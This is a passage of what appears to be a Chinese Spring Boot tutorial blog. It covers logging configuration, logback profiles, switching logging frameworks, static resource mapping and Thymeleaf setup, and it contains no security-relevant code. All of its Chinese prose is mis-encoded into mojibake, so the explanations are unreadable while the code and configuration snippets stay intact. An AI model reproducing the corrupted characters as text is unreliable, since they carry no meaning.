åœ¨å½“å‰ç£ç›˜çš„æ ¹è·¯å¾„ä¸‹åˆ›å»ºspringæ–‡ä»¶å¤¹å’Œé‡Œé¢çš„logæ–‡ä»¶å¤¹ï¼›ä½¿ç”¨Â spring.log ä½œä¸ºé»˜è®¤æ–‡ä»¶</span></span><br><span class="line"><span class="attr">logging.path</span>=<span class="string">/spring/log</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#  åœ¨æ§åˆ¶å°è¾“å‡ºçš„æ—¥å¿—çš„æ ¼å¼</span></span><br><span class="line"><span class="attr">logging.pattern.console</span>=<span class="string">%d&#123;yyyy-MM-dd&#125; [%thread] %-5level %logger&#123;50&#125; - %msg%n</span></span><br><span class="line"><span class="comment"># æŒ‡å®šæ–‡ä»¶ä¸­æ—¥å¿—è¾“å‡ºçš„æ ¼å¼</span></span><br><span class="line"><span class="attr">logging.pattern.file</span>=<span class="string">%d&#123;yyyy-MM-dd&#125; === [%thread] === %-5level === %logger&#123;50&#125; ==== %msg%n</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>logging.file</th><th>logging.path</th><th>Example</th><th>Description</th></tr></thead><tbody><tr><td>(none)</td><td>(none)</td><td></td><td>åªåœ¨æ§åˆ¶å°è¾“å‡º</td></tr><tr><td>æŒ‡å®šæ–‡ä»¶å</td><td>(none)</td><td>my.log</td><td>è¾“å‡ºæ—¥å¿—åˆ°my.logæ–‡ä»¶</td></tr><tr><td>(none)</td><td>æŒ‡å®šç›®å½•</td><td>&#x2F;var&#x2F;log</td><td>è¾“å‡ºåˆ°æŒ‡å®šç›®å½•çš„ spring.log æ–‡ä»¶ä¸­</td></tr></tbody></table><h3><span id="2-æŒ‡å®šé…ç½®">2ã€æŒ‡å®šé…ç½®</span></h3><p>ç»™ç±»è·¯å¾„ä¸‹æ”¾ä¸Šæ¯ä¸ªæ—¥å¿—æ¡†æ¶è‡ªå·±çš„é…ç½®æ–‡ä»¶å³å¯ï¼›SpringBootå°±ä¸ä½¿ç”¨ä»–é»˜è®¤é…ç½®çš„äº†</p><table><thead><tr><th>Logging System</th><th>Customization</th></tr></thead><tbody><tr><td>Logback</td><td><code>logback-spring.xml</code>, <code>logback-spring.groovy</code>, <code>logback.xml</code> or <code>logback.groovy</code></td></tr><tr><td>Log4j2</td><td><code>log4j2-spring.xml</code> or <code>log4j2.xml</code></td></tr><tr><td>JDK (Java Util Logging)</td><td><code>logging.properties</code></td></tr></tbody></table><p>logback.xmlï¼šç›´æ¥å°±è¢«æ—¥å¿—æ¡†æ¶è¯†åˆ«äº†ï¼›</p><p><strong>logback-spring.xml</strong>ï¼šæ—¥å¿—æ¡†æ¶å°±ä¸ç›´æ¥åŠ è½½æ—¥å¿—çš„é…ç½®é¡¹ï¼Œç”±SpringBootè§£ææ—¥å¿—é…ç½®ï¼Œå¯ä»¥ä½¿ç”¨SpringBootçš„é«˜çº§ProfileåŠŸèƒ½</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">springProfile</span> <span class="attr">name</span>=<span class="string">&quot;staging&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- configuration to be enabled when the &quot;staging&quot; profile is active --&gt;</span></span><br><span class="line">  å¯ä»¥æŒ‡å®šæŸæ®µé…ç½®åªåœ¨æŸä¸ªç¯å¢ƒä¸‹ç”Ÿæ•ˆ</span><br><span class="line"><span class="tag">&lt;/<span class="name">springProfile</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¦‚ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;stdout&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        æ—¥å¿—è¾“å‡ºæ ¼å¼ï¼š</span></span><br><span class="line"><span class="comment">%dè¡¨ç¤ºæ—¥æœŸæ—¶é—´ï¼Œ</span></span><br><span class="line"><span class="comment">%threadè¡¨ç¤ºçº¿ç¨‹åï¼Œ</span></span><br><span class="line"><span class="comment">%-5levelï¼šçº§åˆ«ä»å·¦æ˜¾ç¤º5ä¸ªå­—ç¬¦å®½åº¦</span></span><br><span class="line"><span class="comment">%logger&#123;50&#125; è¡¨ç¤ºloggeråå­—æœ€é•¿50ä¸ªå­—ç¬¦ï¼Œå¦åˆ™æŒ‰ç…§å¥ç‚¹åˆ†å‰²ã€‚ </span></span><br><span class="line"><span class="comment">%msgï¼šæ—¥å¿—æ¶ˆæ¯ï¼Œ</span></span><br><span class="line"><span class="comment">%næ˜¯æ¢è¡Œç¬¦</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">layout</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.classic.PatternLayout&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">springProfile</span> <span class="attr">name</span>=<span class="string">&quot;dev&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; ----&gt; [%thread] ---&gt; %-5level %logger&#123;50&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">springProfile</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">springProfile</span> <span class="attr">name</span>=<span class="string">&quot;!dev&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; ==== [%thread] ==== %-5level %logger&#123;50&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">springProfile</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">layout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœä½¿ç”¨logback.xmlä½œä¸ºæ—¥å¿—é…ç½®æ–‡ä»¶ï¼Œè¿˜è¦ä½¿ç”¨profileåŠŸèƒ½ï¼Œä¼šæœ‰ä»¥ä¸‹é”™è¯¯</p><p> <code>no applicable action for [springProfile]</code></p><h2><span id="5-åˆ‡æ¢æ—¥å¿—æ¡†æ¶">5ã€åˆ‡æ¢æ—¥å¿—æ¡†æ¶</span></h2><p>å¯ä»¥æŒ‰ç…§slf4jçš„æ—¥å¿—é€‚é…å›¾ï¼Œè¿›è¡Œç›¸å…³çš„åˆ‡æ¢ï¼›</p><p>slf4j+log4jçš„æ–¹å¼ï¼›</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-classic<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-over-slf4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-log4j12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ‡æ¢ä¸ºlog4j2</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-log4j2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h1><span id="å››-webå¼€å‘">å››ã€Webå¼€å‘</span></h1><h2><span id="1-ç®€ä»‹">1ã€ç®€ä»‹</span></h2><p>ä½¿ç”¨SpringBootï¼›</p><p><strong>1ï¼‰ã€åˆ›å»ºSpringBootåº”ç”¨ï¼Œé€‰ä¸­æˆ‘ä»¬éœ€è¦çš„æ¨¡å—ï¼›</strong></p><p><strong>2ï¼‰ã€SpringBootå·²ç»é»˜è®¤å°†è¿™äº›åœºæ™¯é…ç½®å¥½äº†ï¼Œåªéœ€è¦åœ¨é…ç½®æ–‡ä»¶ä¸­æŒ‡å®šå°‘é‡é…ç½®å°±å¯ä»¥è¿è¡Œèµ·æ¥</strong></p><p><strong>3ï¼‰ã€è‡ªå·±ç¼–å†™ä¸šåŠ¡ä»£ç ï¼›</strong></p><p><strong>è‡ªåŠ¨é…ç½®åŸç†ï¼Ÿ</strong></p><p>è¿™ä¸ªåœºæ™¯SpringBootå¸®æˆ‘ä»¬é…ç½®äº†ä»€ä¹ˆï¼Ÿèƒ½ä¸èƒ½ä¿®æ”¹ï¼Ÿèƒ½ä¿®æ”¹å“ªäº›é…ç½®ï¼Ÿèƒ½ä¸èƒ½æ‰©å±•ï¼Ÿxxx</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xxxxAutoConfigurationï¼šå¸®æˆ‘ä»¬ç»™å®¹å™¨ä¸­è‡ªåŠ¨é…ç½®ç»„ä»¶ï¼›</span><br><span class="line">xxxxProperties:é…ç½®ç±»æ¥å°è£…é…ç½®æ–‡ä»¶çš„å†…å®¹ï¼›</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="2-springbootå¯¹é™æ€èµ„æºçš„æ˜ å°„è§„åˆ™">2ã€SpringBootå¯¹é™æ€èµ„æºçš„æ˜ å°„è§„åˆ™ï¼›</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;spring.resources&quot;, ignoreUnknownFields = false)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ResourceProperties</span> <span class="keyword">implements</span> <span class="title class_">ResourceLoaderAware</span> &#123;</span><br><span class="line">  <span class="comment">//å¯ä»¥è®¾ç½®å’Œé™æ€èµ„æºæœ‰å…³çš„å‚æ•°ï¼Œç¼“å­˜æ—¶é—´ç­‰</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">WebMvcAuotConfigurationï¼š</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addResourceHandlers</span><span class="params">(ResourceHandlerRegistry registry)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">this</span>.resourceProperties.isAddMappings()) &#123;</span><br><span class="line">logger.debug(<span class="string">&quot;Default resource handling disabled&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Integer</span> <span class="variable">cachePeriod</span> <span class="operator">=</span> <span class="built_in">this</span>.resourceProperties.getCachePeriod();</span><br><span class="line"><span class="keyword">if</span> (!registry.hasMappingForPattern(<span class="string">&quot;/webjars/**&quot;</span>)) &#123;</span><br><span class="line">customizeResourceHandlerRegistration(</span><br><span class="line">registry.addResourceHandler(<span class="string">&quot;/webjars/**&quot;</span>)</span><br><span class="line">.addResourceLocations(</span><br><span class="line"><span class="string">&quot;classpath:/META-INF/resources/webjars/&quot;</span>)</span><br><span class="line">.setCachePeriod(cachePeriod));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">String</span> <span class="variable">staticPathPattern</span> <span class="operator">=</span> <span class="built_in">this</span>.mvcProperties.getStaticPathPattern();</span><br><span class="line">         <span class="comment">//é™æ€èµ„æºæ–‡ä»¶å¤¹æ˜ å°„</span></span><br><span class="line"><span class="keyword">if</span> (!registry.hasMappingForPattern(staticPathPattern)) &#123;</span><br><span class="line">customizeResourceHandlerRegistration(</span><br><span class="line">registry.addResourceHandler(staticPathPattern)</span><br><span class="line">.addResourceLocations(</span><br><span class="line"><span class="built_in">this</span>.resourceProperties.getStaticLocations())</span><br><span class="line">.setCachePeriod(cachePeriod));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//é…ç½®æ¬¢è¿é¡µæ˜ å°„</span></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> WelcomePageHandlerMapping <span class="title function_">welcomePageHandlerMapping</span><span class="params">(</span></span><br><span class="line"><span class="params">ResourceProperties resourceProperties)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">WelcomePageHandlerMapping</span>(resourceProperties.getWelcomePage(),</span><br><span class="line"><span class="built_in">this</span>.mvcProperties.getStaticPathPattern());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//é…ç½®å–œæ¬¢çš„å›¾æ ‡</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnProperty(value = &quot;spring.mvc.favicon.enabled&quot;, matchIfMissing = true)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">FaviconConfiguration</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> ResourceProperties resourceProperties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">FaviconConfiguration</span><span class="params">(ResourceProperties resourceProperties)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.resourceProperties = resourceProperties;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> SimpleUrlHandlerMapping <span class="title function_">faviconHandlerMapping</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">SimpleUrlHandlerMapping</span> <span class="variable">mapping</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleUrlHandlerMapping</span>();</span><br><span class="line">mapping.setOrder(Ordered.HIGHEST_PRECEDENCE + <span class="number">1</span>);</span><br><span class="line">             <span class="comment">//æ‰€æœ‰  **/favicon.ico </span></span><br><span class="line">mapping.setUrlMap(Collections.singletonMap(<span class="string">&quot;**/favicon.ico&quot;</span>,</span><br><span class="line">faviconRequestHandler()));</span><br><span class="line"><span class="keyword">return</span> mapping;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> ResourceHttpRequestHandler <span class="title function_">faviconRequestHandler</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">ResourceHttpRequestHandler</span> <span class="variable">requestHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceHttpRequestHandler</span>();</span><br><span class="line">requestHandler</span><br><span class="line">.setLocations(<span class="built_in">this</span>.resourceProperties.getFaviconLocations());</span><br><span class="line"><span class="keyword">return</span> requestHandler;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;1ï¼‰ã€æ‰€æœ‰ &#x2F;webjars&#x2F;** ï¼Œéƒ½å» classpath:&#x2F;META-INF&#x2F;resources&#x2F;webjars&#x2F; æ‰¾èµ„æºï¼›&#x3D;&#x3D;</p><p>â€‹webjarsï¼šä»¥jaråŒ…çš„æ–¹å¼å¼•å…¥é™æ€èµ„æºï¼›</p><p><a href="http://www.webjars.org/">http://www.webjars.org/</a></p><p><img src="/2020/03/30/Spring%20Boot%E7%AC%94%E8%AE%B0/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180203181751.png"></p><p>localhost:8080&#x2F;webjars&#x2F;jquery&#x2F;3.3.1&#x2F;jquery.js</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--å¼•å…¥jquery-webjar--&gt;</span>åœ¨è®¿é—®çš„æ—¶å€™åªéœ€è¦å†™webjarsä¸‹é¢èµ„æºçš„åç§°å³å¯</span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.webjars<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jquery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;2ï¼‰ã€â€&#x2F;**â€ è®¿é—®å½“å‰é¡¹ç›®çš„ä»»ä½•èµ„æºï¼Œéƒ½å»ï¼ˆé™æ€èµ„æºçš„æ–‡ä»¶å¤¹ï¼‰æ‰¾æ˜ å°„&#x3D;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;classpath:/META-INF/resources/&quot;, </span><br><span class="line">&quot;classpath:/resources/&quot;,</span><br><span class="line">&quot;classpath:/static/&quot;, </span><br><span class="line">&quot;classpath:/public/&quot; </span><br><span class="line">&quot;/&quot;ï¼šå½“å‰é¡¹ç›®çš„æ ¹è·¯å¾„</span><br></pre></td></tr></table></figure><p>localhost:8080&#x2F;abc &#x3D;&#x3D;&#x3D;  å»é™æ€èµ„æºæ–‡ä»¶å¤¹é‡Œé¢æ‰¾abc</p><p>&#x3D;&#x3D;3ï¼‰ã€æ¬¢è¿é¡µï¼› é™æ€èµ„æºæ–‡ä»¶å¤¹ä¸‹çš„æ‰€æœ‰index.htmlé¡µé¢ï¼›è¢«â€&#x2F;**â€æ˜ å°„ï¼›&#x3D;&#x3D;</p><p>â€‹localhost:8080&#x2F;   æ‰¾indexé¡µé¢</p><p>&#x3D;&#x3D;4ï¼‰ã€æ‰€æœ‰çš„ **&#x2F;favicon.ico  éƒ½æ˜¯åœ¨é™æ€èµ„æºæ–‡ä»¶ä¸‹æ‰¾ï¼›&#x3D;&#x3D;</p><h2><span id="3-æ¨¡æ¿å¼•æ“">3ã€æ¨¡æ¿å¼•æ“</span></h2><p>JSPã€Velocityã€Freemarkerã€Thymeleaf</p><p><img src="/2020/03/30/Spring%20Boot%E7%AC%94%E8%AE%B0/template-engine.png"></p><p>SpringBootæ¨èçš„Thymeleafï¼›</p><p>è¯­æ³•æ›´ç®€å•ï¼ŒåŠŸèƒ½æ›´å¼ºå¤§ï¼›</p><h3><span id="1-å¼•å…¥thymeleaf">1ã€å¼•å…¥thymeleafï¼›</span></h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          2.1.6</span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">åˆ‡æ¢thymeleafç‰ˆæœ¬</span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">thymeleaf.version</span>&gt;</span>3.0.9.RELEASE<span class="tag">&lt;/<span class="name">thymeleaf.version</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- å¸ƒå±€åŠŸèƒ½çš„æ”¯æŒç¨‹åº  thymeleaf3ä¸»ç¨‹åº  layout2ä»¥ä¸Šç‰ˆæœ¬ --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- thymeleaf2   layout1--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">thymeleaf-layout-dialect.version</span>&gt;</span>2.2.2<span class="tag">&lt;/<span class="name">thymeleaf-layout-dialect.version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure><h3><span id="2-thymeleafä½¿ç”¨">2ã€Thymeleafä½¿ç”¨</span></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;spring.thymeleaf&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThymeleafProperties</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Charset</span> <span class="variable">DEFAULT_ENCODING</span> <span class="operator">=</span> Charset.forName(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">MimeType</span> <span class="variable">DEFAULT_CONTENT_TYPE</span> <span class="operator">=</span> MimeType.valueOf(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DEFAULT_PREFIX</span> <span class="operator">=</span> <span class="string">&quot;classpath:/templates/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DEFAULT_SUFFIX</span> <span class="operator">=</span> <span class="string">&quot;.html&quot;</span>;</span><br><span class="line">  <span class="comment">//</span></span><br></pre></td></tr></table></figure><p>åªè¦æˆ‘ä»¬æŠŠHTMLé¡µé¢æ”¾åœ¨classpath:&#x2F;templates&#x2F;ï¼Œthymeleafå°±èƒ½è‡ªåŠ¨æ¸²æŸ“ï¼›</p><p>ä½¿ç”¨ï¼š</p><p>1ã€å¯¼å…¥thymeleafçš„åç§°ç©ºé—´</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2ã€ä½¿ç”¨thymeleafè¯­æ³•ï¼›</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span 